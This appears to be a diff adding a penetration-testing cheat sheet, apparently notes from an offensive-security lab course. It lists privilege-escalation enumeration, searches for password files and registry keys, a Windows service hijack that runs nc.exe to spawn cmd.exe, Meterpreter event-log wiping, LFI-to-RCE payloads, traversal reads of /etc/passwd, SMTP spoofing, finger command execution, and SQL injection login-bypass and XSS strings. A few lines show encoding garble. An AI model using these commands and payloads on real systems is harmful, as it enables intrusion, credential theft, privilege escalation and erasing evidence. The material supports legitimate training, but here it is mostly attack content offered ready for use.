+mount
+df -h
+# to find writeable file system use find command below
+#unmounted fs's?
+cat /etc/fstab
+#advanced permissions
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+#where can be written and executed from?
+find / -writable -type d 2>/dev/null      # world-writeable folders
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+#need to run this on each filesytem from df/mount to test writeability 
+
+find / -perm -o x -type d 2>/dev/null     # world-executable folders
+
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+#any problem files? world-writeable, nobody files
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print  find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+ # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+
+#what dev/tools/langs installed?
+find / -name perl*
+find / -name python*
+find / -name gcc* 2>/dev/null
+find / -name cc
+
+#how can files be uploaded
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
+
+
+###################################
+#### SURVEY WINDOWS          ######
+###################################
+http://www.fuzzysecurity.com/tutorials/16.html
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+hostname
+echo %username%
+net users
+ipconfig /all
+route print
+arp -A
+netstat -ano
+netsh firewall show state
+netsh firewall show config
+netsh firewall set opmode disable
+schtasks /query /fo LIST /v
+tasklist /SVC
+net start
+DRIVERQUERY
+wmic /?
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+
+#These files either contain clear-text passwords or in a Base64 encoded format. 
+dir c:\sysprep.inf
+dir c:\sysprep\sysprep.xml
+dir %WINDIR%\Panther\Unattend\Unattended.xml
+dir %WINDIR%\Panther\Unattended.xml
+
+# This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.xml *.ini *.txt
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+sc qc Spooler
+accesschk.exe -ucqv Spooler
+accesschk.exe -uwcqv "Authenticated Users" -accepteula * 
+accesschk.exe -uwcqv "<your username>" -accepteula * 
+
+accesschk.exe -ucqv SSDPSRV
+accesschk.exe -ucqv upnphost
+sc qc upnphost
+sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+net start upnphost
+
+###################################
+#### SNIFFER                  ######
+###################################
+use sniffer
+sniffer_interfaces
+sniffer_start <int_num>
+sniffer_stop <int_num>
+sniffer_stats <int_num>
+sniffer_dump <int_num> <file_loc>
+sniffer_release <int_num>
+download <file_loc>
+
+####################################
+##### SHELL TO METERPRETER #########
+####################################
+use post/multi/manage/shell_to_meterpreter
+set session 1
+run
+
+####################################
+#####  METERPRETER         #########
+####################################
+# Delete event logs
+clearev
+
+# Event log configuration
+run event_manager -i 
+
+# List entries 
+run event_manager -l Application
+run event_manager -l Security
+run event_manager -l System
+
+# Clear specific event log
+run event_manager -c Application
+run event_manager -c Security
+run event_manager -c System
+
+####################################
+#####  LFI/RFI         #########
+####################################
+page=/proc/self/environ <-- a great way to inject a backdoor via the User Agent
+page=/var/log/<log file path> <-- can poison logs if you know the location
+page=/proc/self/cmdline <-- grab the HTTP config
+page=/proc/self/fd/<some number> <-- cycle through these to find the log files *neat technique hey*
+page=expect://ls <-- allows code execution though its not enabled by default
+page=php://input&cmd=ls <-- have to convert the GET request to POST but with it you achieve RCE also use this a lot on windows targets
+page=php://filter/convert.base64-encode/resource= <-- a great way to read web pages that is executed
+page=zip:// <--abusing this can get you a backdoor uploaded
+
+WINDOWS/system32/drivers/etc/hosts
+
+
+###################################
+#### JOHN THE RIPPER         ######
+###################################
+john --wordlist=wordlist.txt --rules --stdout > mutated.txt
+
+####################################
+##### DIRBUSTER           ##########
+####################################
+dirbuster
+wordlists https://github.com/diasdavid/node-dirbuster/tree/master/lists
+/root/PWK/wordlists-dirbuster/directory-list-2.3-medium.txt
+
+
+####################################
+##### DOTDOTPWN           ##########
+####################################
+./dotdotpwn.pl -o unix -m http -u http://10.11.1.8/internal/index.php -M POST -b -h 10.11.1.8
+
+./dotdotpwn.pl -o unix -m payload -p payload_sample.txt -u http://10.11.1.8/internal/index.php -M POST -b -h 10.11.1.8 -x 80 -k "root:" -f /etc/passwd
+vi payload_sample.txt
+
+*if connection hangs
+./killcx 10.11.1.8:80 tap0
+
+####################################
+#####      MS-SQL            #######
+####################################
+#untested... but might work?
+sqlcmd -S <ip addr> -U <user> -P <password> -Q "SELECT @@VERSION AS 'SQL SERVER VERSION';"
+
+
+####################################
+##### ENUMERATION GUIDE ############
+####################################
+# port 21
+nc <ip> 21
+ftp <ip>
+ftp@example.com
+
+** check for anonymous access
+Username:
+anonymous
+anon
+Password: 
+<blank>
+any@email.com
+
+** configuration files
+ftpusers
+ftp.conf
+proftpd.conf
+
+# port 22
+nc <ip> 22
+scanssh
+scanssh -p -r -e excludes random(no.)/Network_ID/Subnet_Mask
+
+** configuration files
+ssh_config
+sshd_config
+authorized_keys
+ssh_known_hosts
+shosts
+
+# port 23
+nc <ip>
+
+** configuration files
+/etc/inetd.conf
+/etc/xinetd.d/nc
+/etc/xinetd.d/snc
+
+# port 25 
+nc <ip> 25
+
+*chck user exists
+VRFY <user>
+*chck user valid
+EXPN <user>
+*spoof test
+HELO anything MAIL FROM: spoofed_address RCPT TO:valid_mail_account DATA . QUIT 
+*relay test
+HELO anything
+    Identical to/from - mail from: <nobody@domain> rcpt to: <nobody@domain>
+    Unknown domain - mail from: <user@unknown_domain>
+    Domain not present - mail from: <user@localhost>
+    Domain not supplied - mail from: <user>
+    Source address omission - mail from: <> rcpt to: <nobody@recipient_domain>
+    Use IP address of target server - mail from: <user@IP_Address> rcpt to: <nobody@recipient_domain>
+    Use double quotes - mail from: <user@domain> rcpt to: <"user@recipent-domain">
+    User IP address of the target server - mail from: <user@domain> rcpt to: <nobody@recipient_domain@[IP Address]>
+    Disparate formatting - mail from: <user@[IP Address]> rcpt to: <@domain:nobody@recipient-domain>
+    Disparate formatting2 - mail from: <user@[IP Address]> rcpt to: <recipient_domain!nobody@[IP Address]>
+
+** configuration files
+sendmail.cf
+submit.cf
+
+# port 53
+host [-aCdlnrTwv ] [-c class ] [-N ndots ] [-R number ] [-t type ] [-W wait ] name [server ] -v verbose format -t (query type) Allows a user to specify a record type i.e. A, NS, or PTR. -a Same as Ã¢â‚¬â€œt ANY. -l Zone transfer (if allowed). -f Save to a specified filename.
+
+nslookup [ -option ... ] [ host-to-find | - [ server ]] 
+
+dig [ @server ] [-b address ] [-c class ] [-f filename ] [-k filename ] [-p port# ] [-t type ] [-x addr ] [-y name:key ] [-4 ] [-6 ] [name ] [type ] [class ] [queryopt... ]
+
+whois-h Use the named host to resolve the query -a Use ARIN to resolve the query -r Use RIPE to resolve the query -p Use APNIC to resolve the query -Q Perform a quick lookup
+
+perl /opt/BiLE-suite-master/BiLE.pl [website] [project_name]
+perl /opt/BiLE-suite-master/BiLE-weigh.pl [website] [input file]
+perl /opt/BiLE-suite-master/vet-IPrange.pl [input file] [true domain file] [output file] <range>
+perl /opt/BiLE-suite-master/vet-mx.pl [input file] [true domain file] [output file]
+perl /opt/BiLE-suite-master/exp-tld.pl [input file] [output file]
+perl /opt/BiLE-suite-master/jarf-dnsbrute [domain_name] (brutelevel) [file_with_names]
+perl /opt/BiLE-suite-master/qtrace.pl [ip_address_file] [output_file]
+perl /opt/BiLE-suite-master/jarf-rev [subnetblock] [nameserver]
+
+** configuration files
+host.conf
+resolv.conf
+named.conf
+
+# port 69
+tftp ip_address PUT local_file
+tftp ip_address GET conf.txt (or other files)
+#Solarwinds TFTP server
+tftp Ã¢â‚¬â€œ i <IP> GET /etc/passwd (old Solaris)
+#windows tftp server
+tftp 10.11.1.226
+GET \WINDOWS\System32\drivers\etc\hosts hosts
+
+#enum windows versions 
+#windows 7 (windows 10 contains eula code, can look up version from eula code online)
+GET \WINDOWS\System32\license.rtf license.rtf
+#windows xp
+GET \WINDOWS\System32\eula.txt eula.txt
+
+# port 79
+
+** user enum
+finger 'a b c d e f g h' @example.com
+finger admin@example.com
+finger user@example.com
+finger 0@example.com
+finger .@example.com
+finger **@example.com
+finger test@example.com
+finger @example.com
+
+**command execution
+finger "|/bin/id@example.com"
+finger "|/bin/ls -a /@example.com"
+
+** finger bounce
+finger user@host@victim
+finger @internal@external
+
+# port 80, 8080, etc
+nc <ip> 80
+curl -i -X OPTIONS http://10.11.1.39
+
+** firefox plugins
+	firecat
+	add n edit cookies
+	asnumber
+	headerspy
+	live http headers
+	shazou
+	web developer
+
+** Crawl site
+lynx [options] startfile/URL Options include -traversal -crawl -dump -image_links -source
+httprint
+Metagoofil
+metagoofil.py -d [domain] -l [no. of] -f [type] -o results.html
+
+** Web directory enumeration
+nikto -h <target> <options>
+dirbuster
+gobuster -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e
+gobuster -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s '200,204,301,302,307,403,500' -e
+wikto
+goolag scanner
+
+** Vuln Assess
+*** Method Testing
+nc <ip> 80
+HEAD / HTTP/1.0
+OPTIONS / HTTP/1.0
+PROPFIND / HTTP/1.0
+TRACE / HTTP/1.1
+PUT http://Target_URL/FILE_NAME
+POST http://Target_URL/FILE_NAME HTTP/1.x
+
+** Upload Files
+curl -u <username:password> -T file_to_upload <Target_URL>
+curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" <Target_URL>
+put.pl -h target -r /remote_file_name -f local_file_name
+cadaver **webdav
+
+** View Source
+Hidden Values
+Developer Remarks
+Extraneous Code
+Passwords!
+
+** Input Validation Checks
+*** possible error messages
+NULL
+null
+*** Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.
+'
+"
+;  
+<!
+*** Used to craft SQL Injection queries
+-
+=
++
+"
+*** Used to bypass login screens SQLi
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+*** Used to find command execution vulnerabilities
+"><script>alert(1)</script>
+*** Carriage Return (%0d) Line Feed (%0a)
+%0d
+%0a
+    HTTP Splitting
+        language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
+            i.e. Content-Length= 0 HTTP/1.1 200 OK Content-Type=text/html Content-Length=47<html>blah</html>
+    Cache Poisoning
+        language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
+
+*** byte-length overflows; maximum 7- and 8-bit values
+%7f
+%ff
+*** Integer and underflow vulnerabilities
+-1
+other
+*** Testing for format string vulnerabilities
+%n
+%x
+%s
+*** Directory Traversal Vulnerabilities
+../
+*** Wildcard characters can sometimes present DoS issues or information disclosure
+%
+_
+* 
+*** Overflow vulns
+Ax1024+
+
+
+
+
